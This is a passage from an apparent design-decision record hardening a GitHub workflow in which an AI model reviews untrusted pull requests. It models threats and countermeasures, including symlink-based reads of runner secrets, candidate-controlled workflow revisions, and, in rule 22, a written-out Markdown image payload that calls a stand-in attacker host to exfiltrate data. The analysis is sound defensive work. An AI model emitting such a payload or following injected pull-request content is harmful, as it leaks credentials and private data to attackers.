   `pull_request.head.sha` ahead of the commit that review describes, so checking
   out the head reviews different code from the one the forwarded body refers to.
   `ci/review_github_current_state.py` already treats `review.commit_id` as a
   review's `head_commit`, and the guard step follows the same identity -- gated on
   `github.event_name == 'pull_request_review'`, not on the field's presence, since
   a `pull_request_review_comment` payload can carry a review object too and
   selecting it there would reintroduce exactly the dropped-commits defect below.
   `comment.commit_id` is deliberately **not** used the same way: an inline comment
   can hang off an earlier commit of a multi-commit Pull Request, so treating it as
   the head would silently drop the later commits while the report still reads as a
   review of the whole Pull Request. The comment's own commit identity is forwarded
   in the prompt for interpreting its hunk instead, which is what rule 17 is for.

    *Withdrawn by Decision 0096 rule 13,* with submitted reviews and inline comments. The comparison is the live Pull Request (Decision 0096 rule 5).

19. **Every interpolated context is classified, and unknown ones fail closed.** A
   contract test that recognises only the contexts already in use is not a
   contract: an added `secrets.*`, `env.*`, `vars.*` or `needs.*` interpolation
   would contribute no identifier and leave the exhaustive-source test green, in a
   job that publishes its output publicly. The test therefore strips string
   literals, classifies every remaining token as a known function, a keyword or a
   context, and fails on anything it cannot place. Positive controls assert that
   each of those contexts is reported as unadmitted, so the test cannot pass
   through a blind spot in its own parser.

    *Since Decision 0096 this holds through the relay:* the prompt now interpolates identity values only.

20. **The symlink hazard is removed rather than guarded.** `Read` follows a symlink
   to its target before a report reaches a public step summary, and the prompt sends
   the reviewer to `README.md` and `AGENTS.md`, so a candidate that replaced either
   with a symlink to a runner path would turn the entry route into an exfiltration
   primitive. Rule 9 does not cover it: the fork guard constrains whose repository
   the head comes from, not what a branch inside this repository contains. An earlier
   revision of this Decision answered it with a guard step that refused a candidate
   containing symlinks, mirroring `tools/candidate_prepare.py`. Rule 21 supersedes
   that: no candidate tree is materialised at all, so there is no candidate symlink,
   mode or file to guard, and the entry route is the protected workflow revision's -- not the
   base's, which that revision can postdate or differ from. A guard is
   retained in `tools/candidate_prepare.py` for preparation, where a tree genuinely
   must exist; this job needs none.
21. **No candidate tree is materialised in the credential-bearing job.**
   `docs/security.md` of the pinned action warns against checking out an untrusted
   ref before it, and CodeQL flags the shape itself -- a privileged workflow that
   materialises a contributor-controlled tree -- however that tree is placed. Three
   findings in this surface, and two failed attempts to grant a constrained git, were
   all downstream of accepting the shape and hardening inside it. The shape is
   therefore gone.

   Only the **protected default branch** is checked out, named by a repository
   property rather than by anything a trigger carries. Three alternatives were each
   wrong. A bare checkout follows `github.ref`, which on `pull_request_review` and
   `pull_request_review_comment` -- two of the four admitted triggers -- is
   `refs/pull/N/merge`, the candidate merged into its base, and it fails outright when
   a Pull Request conflicts with its base and has no merge ref. The resolved base SHA
   is a step output, which CodeQL treats as untrusted provenance in a privileged
   workflow, and it is in any case the base a contributor chose rather than the branch
   this repository protects. The head is the candidate itself. The default branch
   supplies the entry route the prompt names. It is **not** a pre-change state, and
   this Decision must not call it one: the prompt tells the reviewer never to use that
   checkout for this change's state, and the rules below say the same, so describing it
   as readable pre-change state here would license exactly the reading the prompt
   forbids. The comparison is still asked for against the *resolved* base, so the diff
   is exact; the change itself arrives only as the artefacts of rule 12, built from the
   provider's comparison for the two resolved revisions. No candidate file, mode or
   symlink is ever written to the runner, and the reviewer is given no
   `--add-dir`.

   What this costs is real and is accepted: the reviewer sees this change only through
   the artefacts, so both sides of every changed file come from the diff alone. The gain is that an entire hazard class -- candidate-authored entry routes,
   symlinked reads, mode tricks, and execution of candidate content -- cannot arise
   rather than being guarded against. Read confinement remains defence-in-depth
   only: a `settings` deny list covers the obvious runner paths **for every granted
   filesystem tool**, since a `Read` rule does not constrain `Grep`, whose
   ripgrep-backed search would return matching lines from the same path. The runner's
   own working areas are included, because the raw event payload under `_temp` still
   contains the issue and Pull Request bodies that rule 15 deliberately withholds --
   denying only `.ssh` beneath `/home` left the trust gate reachable around. This
   repository still cannot verify the reviewer's enforcement of those rules, so the
   structural control is the absence of candidate content rather than the deny list.

   The checkout is pinned to `github.workflow_sha`, the revision GitHub bound the run
   to, rather than to a branch name resolved when the job executes: a queued run whose
   default branch has since advanced would otherwise execute newer collection scripts
   than the workflow and Decision it started under, silently moving this boundary.

   The prompt states what the checkout actually is: the default branch, which may have
   advanced past the Pull Request's base or belong to a different branch, and it directs
   pre-change reads to `base/` **and away from the checkout**. Declaring the tree
   non-authoritative while still instructing the reviewer to read it for pre-change
   state was the same defect in a second place. Saying "the Pull Request's base" was false in both cases and would have had
   the reviewer read unrelated upstream state as the pre-change state. The exact
   before and after state lives only in the artefacts, and the prompt says so. This
   also answers the residual on trusting the entry route: the route is a **known
   protected revision** rather than a base a contributor chose, and the resolved base
   is used only for the comparison and for `base/`. The prompt directs the reviewer to
   `base/` for pre-change state and reserves the checkout for the route and general
   context, so the tree being non-authoritative is stated to the reviewer rather than
   only recorded here -- which is what an earlier revision of this Decision got wrong
   by calling it a "stated caveat" while never stating it.

    *Since Decision 0096 this holds through the relay:* the job can no longer be candidate-supplied at all.

22. **The report is published by this repository, with render-time fetches removed.**
   *Extended by Decision 0098* to the comment the posting job makes.
   The action's `display_report` input documents itself as outputting
   "Claude-authored content in the GitHub Step Summary" and says it "should only be
   used in cases where the action is used solely with trusted input". This job's input
   is a candidate Pull Request, which is untrusted by definition, so that setting is
   `false`.

   The hazard is specific and is the one channel every other rule here misses. Rules
   9, 12, 15, 20 and 21 all govern what the reviewer **reads**. This one governs what
   it **publishes**. A step summary renders Markdown, including images, so a report
   that echoes attacker-supplied text can carry `![](https://attacker/?q=...)` which
   is fetched when the page is rendered, with no click, carrying whatever the reviewer
   placed in that URL out of a credential-bearing job. GitHub proxies such images
   through camo, so the request comes from GitHub's infrastructure rather than a
   viewer's browser -- that changes who is seen making it, not whether the attacker
   receives the data. The action's own tests confirm its formatter
   preserves Markdown images.

   A committed script therefore reads the execution file the action exposes, extracts
   the reviewer's final text, and appends it to the summary as **literal text inside
   one fenced block that the script owns**. Nothing inside a code fence is interpreted
   as Markdown or HTML, so no image, `<img>`, link or scheme in the report can cause a
   fetch. The report is bounded and truncated with a notice -- before the block is
   built, so a cut can never land inside the closing fence and leave the rest of the
   summary unterminated. The reviewer's final text is taken from the last result turn
   that actually carries text: an empty result turn was being returned as the report,
   which shadowed real assistant output and published "the reviewer produced no final
   text" over a review that existed. The step runs on `always()` **and nothing else**:
   gating it on the action having produced an execution file meant that a reviewer which
   failed before writing one -- a bad input, a credential problem, a crash at startup --
   produced no summary at all, which is exactly the silent failure `always()` was
   claimed to prevent. The script reports an unreadable or absent file rather than the
   step hiding it.

   **Only a refusal reaches the lossy fallback.** After the retry, every persistent
   failure still entered it, so an authentication error, a permission error or an
   outage was published as "the provider refused the diff" -- an incomplete review
   presented as a complete one, which is the claim class this Decision exists to close.
   The provider answers 406 when a comparison's diff is too large to generate, and that
   is the one status the fallback accepts. It fails closed: an unrecognised failure is
   an error, not a refusal.

   **The artefact says what the prompt says.** Correcting the prompt to stop asking
   which case a no-hunk entry is left `no-patch.txt` still telling the reviewer that
   the status distinguishes them. An artefact contradicting the instruction is worse
   than either being wrong alone, because the reviewer has no third source with which
   to break the tie. The header now carries the same rule, in the same words.

   **The execution file is bounded before it is parsed.** The report is capped at 64
   KiB, but the whole file was materialised first, so an oversized one consumed runner
   memory before any cap applied. A bound that arrives after the cost is not a bound.

   **Every provider request in the job is retried**, not only the comparison. The Pull
   Request lookup on an `issue_comment` event and the unified-diff request were both
   unguarded under `set -eu`; the second is worse than a failure, because treating a
   transient 5xx as a refusal silently downgrades the review to hunks with no
   surrounding context. The lookup is also made **once** and both fields read from that
   one retained response: asking twice let the head change between the fork check and
   the SHA read.

   **`--paginate` does not page this endpoint by itself.** The compare API returns its
   default 250 commits unless `per_page` is given, so a larger comparison silently lost
   every later subject while the cap notice said only that some were missing -- a notice
   that was true about the count and misleading about the cause.

   **The fence is chosen longer than the longest run of backticks anywhere in the
   report**, so no line in it can close the block, whatever containers the text puts
   around it. That is the whole safety argument: one invariant, checkable in a line,
   with no model of Markdown's block structure behind it.

   The shape it replaced scanned for fences and escaped only the lines it believed were
   outside them, and it was **wrong twice**. First, normalising every fence to three
   characters let a four-backtick opening be "closed" by three and reopened by four.
   Following CommonMark exactly fixed that one -- and the second is the instructive one,
   because it was not a coding mistake at all. CommonMark scopes a fence to its
   container: `- a`, then two spaces and a fence, opens a fence **inside the list item**,
   and the next unindented line cannot continue the item lazily, so the item and its
   fence both close and what follows renders. The scanner, which tracked fences without
   tracking containers, still believed it was inside and published an image raw. It was
   reimplementing CommonMark block structure, and each fix made it a slightly better
   implementation of the wrong thing. Removing the need to know where Markdown is
   removes the class, which is the same move rules 20 and 21 make.

   The cost is real and is accepted: the report renders as monospace text, so its
   headings are not headings and its `file:line` references are not links. A report
   whose content is exact and unrendered is worth more here than a rendered one whose
   safety rests on matching another parser's block structure.

   The contract test asserts the block's boundaries, that the report survives **byte for
   byte** inside it, and that no line of the report can close the fence -- over the
   vectors above, both regressions included. The closing rule it checks against is
   re-implemented in the test and so shares any misreading of CommonMark with the
   subject: it catches a coding mistake, which is what a suite can do offline, not a
   wrong reading of the specification.

   The real oracle is GitHub's own renderer, and it was used. Against the head that
   introduced this shape, thirteen vectors were rendered through `gh api /markdown`
   with `mode=gfm`: inline and reference images, raw `<img>`, `<iframe>`, `javascript:`
   and `data:` links, an HTML comment, closing `</code></pre>` tags, a fence inside a
   list item, a fence inside a blockquote, the four-then-three-then-four escalation, a
   tab-indented fence, a backtick in the info string, a tilde fence, and a report that
   closes its own fence. **None rendered an `<img>`, a camo URL or an anchor.** The
   same list-item vector rendered a camo `<img>` through the previous shape, which is
   how the second defect was confirmed rather than argued. That check needs the network
   and so cannot run in the suite, which is why it is recorded here.

   The heading is a claim about the run, so success is **stated, never inferred**: the
   report is published as a review only under a result envelope carrying `subtype:
   "success"` *and* `is_error` exactly `false`. A missing, null or zero flag is the
   absence of a failure signal, not the presence of success -- and both measured runs
   in the table above carried the flag, on success and on failure alike, so requiring
   it refuses nothing a real run produces. There must also be exactly **one** result
   envelope, as this repository's native adapter already requires: with two, the
   status came from one and the text could come from the other, so an error
   diagnostic followed by an empty success was published as a finished review. It
   must also **end the stream**. The pinned action collects SDK messages and breaks on
   the first result ("by SDK contract no further messages follow a result"), so a
   real execution file never has a turn after it; that evidence, read from the
   action's source, is what makes requiring it safe. When
   the result string is empty, the fallback text is taken only from an `assistant`
   turn's `text` blocks, since any turn with message text used to qualify and a user
   or tool turn's text is the reviewer's input, not its report. And the publisher
   always says something: a
   step can fail before the checkout -- rule 25a's guard did, by design, until Decision 0096 removed it, and the checkout itself still can -- leaving no
   publisher on disk, so the step then writes a fixed notice and runs nothing from the
   workspace. Checking out anyway to get the publisher back would execute the revision
   the guard had just refused.

23. **Every review-context script confines its paths, through one check.** The
   committed scripts
   take their directories and files from the workflow, which is trusted -- but a value
   that reaches a file read or write is checked where it is **used**, not where it was
   set. Each resolves its argument and refuses anything outside the runner area it
   belongs to: the workspace for the collectors, the runner temporary directory for the
   publisher's execution file, with an absolute path and an existing parent as the floor
   when no root applies. Degenerate arguments are refused before any of that: an empty
   string resolves to the working directory, which is a real path that would otherwise
   satisfy every check, and a directory where a file is expected is refused here rather
   than failing later with a confusing error or naming something writable. The step summary's own path is deliberately **not** pinned to a
   root: it lives under the runner temporary directory today, but that is an
   implementation detail, and refusing to publish because the runner moved a file would
   lose the review over an assumption about its layout. A later edit of the workflow therefore cannot point
   a collector at `/etc` or the publisher at an arbitrary file, and a static analyser
   reading these scripts in isolation sees the validation rather than an unchecked path.

   There is exactly **one implementation**, in
   `.github/review-context/review_context_paths.py`, which the scripts import. It began
   as a copy in each, and that check has since been wrong twice -- it accepted a leading
   dash, and it accepted an empty argument -- with each fix having to be made in three
   places. A second copy is a second chance to fix one and miss another. Each script is
   run as `python3 .github/review-context/<name>.py`, so the directory holding all of
   them is what Python puts first on its own search path: the import needs no path
   manipulation and never consults the caller's `PATH`. The module is owned by the same
   guardrail as the scripts that import it.

24. **The session is bounded in turns.** `--max-turns` caps how long the reviewer may
   iterate. The prompt bound of rule 3 limits what the session starts with; this limits
   what it can accumulate while running.

25. **The base-context collection may fail without taking the review with it.** It
   runs before the unified diff is requested, so an unhandled failure inside it used to
   end the step and leave the reviewer no context at all -- not a degraded one, an
   absent one. Its invocation is guarded; the failure is named in `base.manifest`,
   where the reviewer is already directed for what `base/` lacks, and the artefacts the
   rest of the step reads are created empty so a missing one cannot end the step
   afterwards. Every escape inside the collector has been closed one at a time, and the
   step does not depend on having found them all.

   **The guard creates only what is missing.** `collect` writes `commits.log`,
   `diff.stat`, `no-patch.txt` and `assembled.diff` *before* its per-file fetch loop,
   which is where a late failure is most likely -- so by then each of them is already
   correct. A failure inside one of those writers comes earlier, and it leaves that
   artefact and the ones after it absent rather than partial, since each is written
   whole or not at all; the guard creates the missing ones empty and names the failure
   (CodeAnt, #330). The `base/` bytes are written *inside* that loop, one file per iteration,
   so a failure on a later entry leaves exactly the bytes the earlier iterations
   fetched: a partial subset, each file whole (Codex, #330, corrected the order this
   paragraph first stated). Creating them unconditionally destroyed exactly the
   degraded context the guard exists to preserve: the commit log was emptied and the
   cap notice then reported a provider truncation that never happened, and a refused
   diff would have moved an emptied `assembled.diff` over per-file patches that
   existed. For the same reason the notice is *appended* to `base.manifest` rather than
   written over it -- the manifest is the last thing `collect` writes, so one that
   exists holds real per-path accounting -- and it does not claim `base/` is empty,
   because the bytes fetched before the failure are still there and still worth
   reading. A count this step manufactured is reported as this step's
   (`[commit log unavailable: ...]`), never as the provider's cap.

   Keeping what exists is only sound if what exists is whole. `assembled.diff` was
   streamed into place entry by entry, so a failure mid-loop left half a hunk that this
   guard then kept as if it were complete (CodeAnt, #330). Every top-level artefact is
   therefore rendered first and renamed into place whole through the same writer as
   `base/`, staged in `.base-staging`: an interrupted one is *absent*, and the guard's
   empty replacement is then reported for what it is.

25a. **The job refuses a workflow revision that is not on the protected branch.**
   Rule 21 keeps the candidate tree away from the credential-bearing job by binding
   the checkout to `github.workflow_sha`. That premise holds only where GitHub
   resolves the workflow from the default branch, and it does not hold for every
   admitted trigger. Measured on this repository's own run history: an
   `issue_comment` run reports `branch=main`, while `pull_request_review` and
   `pull_request_review_comment` runs reported `branch=<candidate>` -- so for those
   two events `github.workflow_sha` is candidate-controlled, and the checkout would
   supply candidate `build_review_context.py` and `chunk_diff.py` to a job holding
   `GH_TOKEN` and `id-token: write`. The author-association gate does not help,
   because it is in the same candidate-controlled file.

   A step before the checkout therefore compares the workflow revision against the
   default branch and refuses unless it is contained in it. It reads no candidate
   bytes, is retried so a transient provider failure cannot become a false refusal,
   and fails closed when the answer is unavailable.

   **What this does not achieve.** Nothing inside a candidate-controlled workflow
   can defend against a candidate that edits that workflow. This blocks an
   accidental candidate revision and forces a deliberate one to edit a
   guardrail-owned file visibly in the Pull Request diff; it is not a substitute for
   not admitting the trigger at all. Removing those two triggers is the stronger
   remedy, and is a trust-boundary change for the owner rather than a review-round
   fix.

   **What this costs, stated plainly.** On an ordinary Pull Request the review
   events' workflow revision *is* the candidate head, which is ahead of the default
   branch, so the guard refuses every mention made in an inline review comment or a
   submitted review. Those two triggers are therefore disabled in practice -- failing
   closed, before Claude runs, with the publisher's fixed notice in the summary --
   until #339 is settled. A mention in the Pull Request conversation (`issue_comment`)
   resolves from the default branch and is unaffected. This is the intended
   behaviour, not a defect in the condition: admitting those runs would hand the
   credentials to a revision the candidate wrote.

     *Decision 0096 rule 10: superseded* -- the relay leaves nothing for this guard to protect. The two triggers it disabled were not restored: Decision 0096 rule 13 withdraws them.

26. **A claim of no changes travels with the condition that makes it true.** Guarding
   the collection gave the step a second way to reach a zero-byte `diff.full`: the
   provider refuses the unified diff, the fallback moves an `assembled.diff` the failed
   collection never filled, and an emptied comparison and an unread one become
   indistinguishable by size. The empty-diff branch therefore tests whether the
   collection ran, and reports a refused diff with no patches behind it as
   `provider-error changed-content` rather than as an examined empty change.
   *Refined by rule 38:* the refusal is now read from the 406 itself, not inferred
   from the collection's status.

27. **A request may not outlast the attempt it belongs to.** The bound on reading an
   error body for classification is the deadline of the attempt that produced the
   error, fixed before the request is made, never the collection's. Bounding it against
   the collection's budget granted a request that had already spent its whole
   per-request allowance a fresh diagnostic budget on top of it, so the exchange passed
   the per-request bound this Decision states while the collection's budget still
   looked healthy. The parameter is named `detail_deadline` for that reason.

28. **An absent file list is unreadable, not empty.** A comparison that omits `files`,
   or sends it as null, was passed through as a change with no files: `base.manifest`
   published `Written: 0. Unavailable: 0` with no notice, so a Pull Request whose
   unified diff still showed hunks had every changed path left without pre-change bytes
   and without a line saying why. `files` must be an array; an empty comparison states
   itself with `[]`. One event also yields one cause -- the shape check is skipped
   after a parse failure rather than run against the empty object it leaves behind, so
   a symptom is not published as a second, independent provider error.

29. **A partial fallback diff carries its condition too.** Rule 26 covered only the
   zero-byte case. A collection that fails *after* writing some per-file patches
   leaves `assembled.diff` non-empty but incomplete, and a provider refusal then
   publishes it as ordinary diff content -- a truncated change read as the whole one,
   which is the failure this Decision exists to prevent, reached from the other side.
   `patches-source` states when the collection did not finish, so a changed file with
   no hunks there is not examined.

   **Superseded by the atomic writer (rules 30-32).** `assembled.diff` is now written
   whole or not at all, before the per-file loop, so the premise no longer holds: a
   present `assembled.diff` is complete, and the notice told the reviewer that hunks it
   had were missing (CodeAnt, #330). The step no longer adds it. An absent
   `assembled.diff` is rule 26's zero-byte case, which states its own condition, and
   the collection's failure is stated in `base.manifest`, where it applies.

30. **The retained `base/` subset is described, and never enumerated in shell.** Rule
   25 stopped the false emptiness claim but left an unknown subset: a path absent from
   `base/` read as "the base had nothing" rather than "the collection never got
   there". The manifest now says that each file present is complete -- each is staged
   and renamed into place whole -- that the *set* is partial, and that a changed file
   absent from `base/` is not examined. It deliberately does **not** list the subset: a
   pathname is candidate-controlled and this artefact is read line by line, so
   enumerating `base/` in shell, where the collector's quoting does not apply, would
   let a newline in a name forge a manifest record. The reviewer can list `base/`
   directly. Staging files (`.<digest>.<random>.partial`) are removed first, because a
   file staged but never renamed is not content and the writer's own cleanup runs in a
   `finally` that a hard stop does not honour.

31. **The manifest's inventory is qualified by what the provider listed.** Its
   preamble promised that every path this collection could not fetch is named below,
   and the prompt presents the manifest as *the* inventory of gaps. A capped
   changed-file list omits the later paths from `files` entirely, so they are never
   sent, never fetched, never counted and never named -- the promise was false for
   exactly the large Pull Requests this collection serves. The claim now covers the
   paths the provider listed, and a capped comparison says so and states that
   everything beyond the cap is not examined. An uncapped comparison carries no such
   line, so the qualification keeps meaning something.

32. **Staging lives outside `base/`, and the sweep removes it whole.** Rule 30 removes
   the writer's staging files before retaining `base/`. The writer first staged beside
   its destination, so the sweep had to recognise staging files by name inside
   `base/` -- first only at the top level, which left the common case of a file in a
   subdirectory behind, and then by the writer's exact name shape at any depth. Both
   were attempts to tell a staging file from a real one by its name, and no name can
   do that: any filename is a legal Git path, and a rename lets the candidate choose
   the destination name, so a real file renamed into the staging shape was deleted
   after a later failure while `Written:` still counted it (CodeAnt, #330). The writer
   therefore stages in `.base-staging`, beside `base/` and never inside it, and
   renames each finished file into place; the collector removes the empty staging
   area on success, and the workflow removes it whole after a failure. Nothing inside
   `base/` is ever deleted by the sweep. The rule that matters for the manifest is
   still **no command output may reach `base.manifest`**: every write to it is a
   `printf` with a literal format.

33. **A provider field counts only as the type it arrived as.** The collector passed
   provider fields through `str()` before checking them. A JSON null became "None",
   which is a legal path name, so a listing record with no name matched a changed path
   called `None`, and that record's type and blob id authorised the write. A number
   became its digits, so a 40-digit number passed as a blob identity on either side,
   and two such fields could make a change `metadata-only`. A rename source that was a
   number named a base file, whose bytes were then written as the renamed file's
   pre-change content, and a merge base that was a number was requested as a ref and
   its answer published as the exact merge-base state (Codex, #330). A field is now
   used only if it is a string;
   anything else is absent, which every reader already handles. A record with no
   name matches no path, a non-string blob id is
   `unclassified-without-blob-identity`, a non-string rename source is
   `unsupported-path`, and a non-string merge base is no exact revision, so nothing
   is fetched.

34. **Only a type collision is a `path-collision`.** The per-file isolation above
   recorded every failed write into `base/` as `path-collision`, which is a statement
   about the repository: one changed path in the way of another. A full disk or an
   I/O error is no such statement, and once the disk was full every remaining file
   received the same false explanation (Codex, #330). The collision label is kept for
   the errors a type collision raises (`EEXIST`, `ENOTDIR`, `EISDIR`). Any other
   failure is `write-failed <path>: <errno name>`, still a recorded gap rather than a
   failed step.

35. **A comparison entry is typed once, where it is admitted.** Rule 33 checked
   provider fields where they were read, and the readers are an open set: after a name,
   a blob id, a rename source and the merge base, a `patch` that was not a string was
   still published, after a refused diff, as the file's actual hunk (Codex, #330). So
   every field the collection reads from an entry -- `patch`, `sha`,
   `previous_filename`, `additions`, `deletions` -- is checked once in `usable_files`.
   One of another type is absent from then on and is named in a `provider-error`
   notice. So is a present JSON null, except for `sha`, the one field GitHub's published
   diff-entry schema marks nullable: a binary file *omits* `patch` (measured on
   microsoft/vscode, where a changed PNG carries no `patch` key), so a null `patch` or
   `previous_filename` is malformed rather than an absence (CodeAnt, #330). A
   hunkless change is classified by blob identity only from a listing record that
   declares a blob kind (`file` or `symlink`). Any other record, or one with no type,
   is `unclassified-without-blob-identity`: an equal `sha` there had read as
   `metadata-only` while the fetch refused the same record (Codex, #330). `status` is required, and must be one GitHub documents (`added`,
   `removed`, `modified`, `renamed`, `copied`, `changed`, `unchanged`): every later
   step decides from it, and a removed file without one read as `metadata-only`, so an
   entry without one is dropped and named, as one without a filename is (Codex,
   #330). Such a dropped entry is counted in `Unavailable:`, and a base-side path is
   validated as given before any listing lookup, so `a//x` cannot borrow the record
   of `a/x` (Codex, #330). A parent directory listing that holds two records for one
   name establishes neither: the path is a `provider-error` and nothing is written,
   because taking the first let record order choose its type and blob id (Codex,
   #330). A path listed more than once is used for none of its
   entries. The repeat is counted over every named entry before any is filtered:
   counted after the status check, a second record dropped for its status left the
   first admitted alone (Codex, #330). Each fetch wrote the same `base/` destination, so the second replaced
   the first while `Written:` counted two; the path is named once as the provider's
   error and counted as unavailable (Codex, #330). An added file is classified from the comparison alone, before the
   collection deadline is consulted, since it costs no request (Codex, #330). An empty
   `patch` is no hunks, as an absent one is (Codex, #330). A line
   count the provider did not give, or gave in the wrong type, is shown in `diff.stat`
   as `?`, not as 0 (Codex, #330). A negative integer is not a line count either:
   `-1` rendered as `+-1` (Codex, #330). The same holds for a contents response: only the kinds the contents API
   documents (`dir`, `symlink`, `submodule`) are `not-a-plain-file`, a statement
   about the base revision. An unknown or non-string kind contradicts the listing,
   which already called the path a file, and is the provider's error.

36. **The fallback diff is rendered into its file.** `assembled.diff` is as large as
   the change. Rendering it into memory and then encoding it held it three times over,
   with the patches already resident, so a large Pull Request could exhaust the runner
   before `base.manifest` was written (Codex, #330). It is rendered straight into its
   staging file and renamed into place whole, as every artefact is.

37. **An unread comparison is not an empty change.** When `comparison.json` names no
   usable file -- unparseable, not an object, without a file list, or listing only
   entries that cannot be used (gitar) -- the
   collector still finishes, with a manifest saying why no changed file was named, and
   an empty `assembled.diff`. It exited 0, so a refused unified diff then published
   that empty fallback as "No changes between base and head": an unexamined change
   presented as an empty one (Codex, #330). The collector now exits 3 in that case. The
   step records it as its own state rather than as a failed collection: the manifest
   is complete, so it is not marked unfinished. An empty fallback is then a
   `provider-error changed-content` stating that no changed content is present, as
   after a failure (rule 38). "No changes" requires a comparison that was read and
   listed no files.

38. **An empty diff says what produced it.** Only the provider's 406 establishes a
   refusal, and the step now records whether that fallback was taken. The 406 is read
   from gh's structured status suffix, `gh: <message> (HTTP <status>)` on stderr, as
   measured from gh 2.82.1 (the body goes to stdout). Matching "http 406" anywhere in
   the text let a different status whose message mentioned 406 read as a refusal, and
   the test stubs printed a shape gh does not (CodeAnt, #330). Inferring it
   from the collector's status published "the provider refused the unified diff" over
   an empty diff the provider had actually returned, after a collection that failed or
   read no comparison for its own reasons (Codex, #330). The opposite case was wrong
   too. After a real 406, a finished collection whose every entry lacked hunks left the
   fallback empty, and that was published as "No changes" for a comparison listing
   changed files.

   "No changes" therefore needs all three of: no refusal, a comparison that was read,
   and an empty file list (`diff.stat`), as rule 37 already required. A first version
   of this rule called any empty diff the provider returned "No changes", whatever the
   base collection did. That contradicted rule 37: an unread comparison, a failed
   collection, or a comparison that listed files beside an empty diff all leave the
   change unestablished (Codex, #330). Every other empty case is a `provider-error
   changed-content` that says which it is:
   - a refusal over hunkless entries points to `no-patch.txt` and `base.manifest`;
   - a refusal with no usable fallback says why none was usable;
   - an empty diff beside a comparison listing files says that the two answers
     contradict;
   - an empty diff beside an unread or unchecked comparison says it was not checked.

   The inverse contradiction is stated too. A comparison read with no files beside a
   unified diff that is not empty still publishes the diff, since its hunks are the
   provider's. But `base.manifest` promises to name every gap, so it now says the files
   the diff shows have no base bytes and no entry (Codex, #330).

## Accepted trade: delivery is no longer on the Pull Request

*Withdrawn by Decision 0098.* A finished review is posted in its thread from a
least-privilege job that runs no model; the step summary remains. The paragraphs below
record the trade as it was made.

Agent mode sets `claudeCommentId: undefined` and provides **no GitHub
comment-posting tool**. A review therefore cannot post itself to the Pull
Request through the action.

Posting would require write scope on `GITHUB_TOKEN`, which Decision 0093 rule 4
forbids. That rule is not amended here. Results are delivered to the workflow run's
step summary -- but written by this repository rather than by the action, for the
reason rule 22 records.

The consequence is explicit: **bounded context is bought at the cost of inline
Pull Request delivery.** The review is durable and linkable from the run, but it
is not in the Pull Request record and peer reviewers do not see it. Restoring
on-Pull-Request delivery without widening `GITHUB_TOKEN` is a separate question
and is not admitted by this Decision.

## Alternatives considered and not taken

Recorded because two of them would have been cheaper than what was built, and a
Decision that omits that is not an honest record.

**Filtering the comments instead of removing them.** The action accepts
`exclude_comments_by_actor`, with wildcards such as `*[bot]`. On the Pull Request where
the reviewer first failed, the volume was almost entirely bot reviewers repeating long
summaries, so one line would very likely have restored it **without changing modes at
all**. It was not taken for two reasons. It filters rather than bounds: enough human
comments reach the same wall, so the failure returns rather than ends. And it keeps tag
mode, which the action runs with `--permission-mode acceptEdits` and
`Bash(git add|commit|rm)` plus a push wrapper -- write access to the working tree and to
the repository, in a job holding the credential. Agent mode's exposure is smaller, not
larger; the tool grant that had to be added back for retrieval is gone entirely as of
rule 12.

**`--max-turns` alone.** A turn cap bounds accumulation during a session but not what
the session begins with, which is what actually failed. It is adopted as rule 24
alongside the prompt bound rather than instead of it.

**An unprivileged producer with a privileged consumer.** CodeQL's own query
documentation endorses this as an alternative to not checking out at all, and it would
recover the post-change file state that rule 21 gives up. It is not taken here because
for `pull_request` events the producing workflow comes from the candidate's own head, so
its artifact is contributor-controlled and the `upload-artifact` digest proves only that
it arrived unaltered, not that it is honest. Verifying each file against the
comparison's blob `sha` would close that, and it is captured as a tracked Work Item
rather than implemented under this Decision.

**Per-file review with relevance filtering.** The published pattern for large changes is
retrieval of the relevant parts rather than the whole diff under a cap, and smaller
models are reported to lose accuracy when given too much. This Decision bounds the whole
and lets the reviewer page through `patches/`; bounding per file instead is a different
shape and is not admitted here.

## Partial supersession of Decision 0093 rule 8

Decision 0093 rule 8 requires that `allowed_bots`, `allowed_non_write_users`,
`assignee_trigger` **and extra mention-job tools** be left unset. Rule 12 grants no
Bash and no git of any shape -- an earlier revision of this Decision granted a git
wrapper and that grant is gone -- so what overrides the tool clause is narrower than
it once was: the read-only filesystem tools `Read`, `Grep` and `Glob`, and the
read-only CI inspection tools of rule 16. Retrieval happens in a trusted workflow step
instead of through any grant.

This is recorded rather than left implicit because the alternative is two
contradictory security contracts in the same repository, and because a test
asserting it enforces "every Decision 0093 invariant" would then be false.

What is superseded is narrow:

- **superseded:** the "extra mention-job tools unset" clause, and only for
  `Read`, `Grep`, `Glob`, `mcp__github_ci__get_ci_status`,
  `mcp__github_ci__get_workflow_run_details` and
  `mcp__github_ci__download_job_log`. A granted tool absent from this list would
  leave rule 8 and rule 16 demanding opposite things for it, so the contract test
  requires every tool in `--allowedTools` to appear here. No raw `git` prefix is
  granted, and rule 12 records why a prefix would not be read-only;
- **retained:** `allowed_bots`, `allowed_non_write_users` and `assignee_trigger`
  stay unset, and no write-capable tool is granted. Rule 8's intent is in fact
  **strengthened** rather than weakened on tools: no `Bash` is granted at all, of
  any shape, because a granted command is run through a shell. Rule 12 records the
  two reproduced chains that led there.

The grant exists because rule 8 predates bounded context. Tag mode supplied the
diff inside the prompt, so no tool was needed to see it; agent mode supplies no
data at all, so a reviewer with neither retrieval nor supplied context has a
checkout it cannot inspect. The retrieval is therefore moved into a trusted step
rather than granted to the reviewer.
Rule 8's intent -- no unnecessary capability in the credential-bearing job -- is
preserved by granting the smallest set that makes the design function.

## Consequences

Bounded review context becomes available on Pull Requests of any size, and the
mention path stops failing before dispatch. In exchange, a review is delivered to
the workflow run rather than to the Pull Request, and the reviewer no longer sees
the discussion, so it may re-raise a settled point as a question. Restoring inline
delivery without widening `GITHUB_TOKEN` remains open.

## What this Decision does not change

Decision 0093 rules 1 to 7; the automatic review workflow's triggers;
`GITHUB_TOKEN` scope; `allowed_bots`, `allowed_non_write_users` or
`assignee_trigger`, all of which stay unset. *Since Decision 0097 the automatic review
workflow is withdrawn,* its file removed with the relay (Decision 0096), so it has no
triggers left to keep. A Claude review remains advisory evidence. It is not reviewer
qualification under Decision 0089, does not populate a protected qualification
snapshot, and carries no approval or merge authority.

## Verification

`tests/test_claude_actions_workflows.py` enforces agent-mode selection, the
bounded interpolation set, the static prompt bound, forwarding of the triggering
request, the reviewed-head checkout binding under a same-repository guard, coverage of
every admitted trigger payload, the resolved-base diff, the declared entry route, the absence of any Bash grant, the trusted context collection with its bound
and its line-safe recoverable parts, the provider-built comparison and its cap
notices, the exact-base file context with its merge-base source, rename handling, non-plain-file
refusals, named budget drops and collision-free manifest, the absence of any
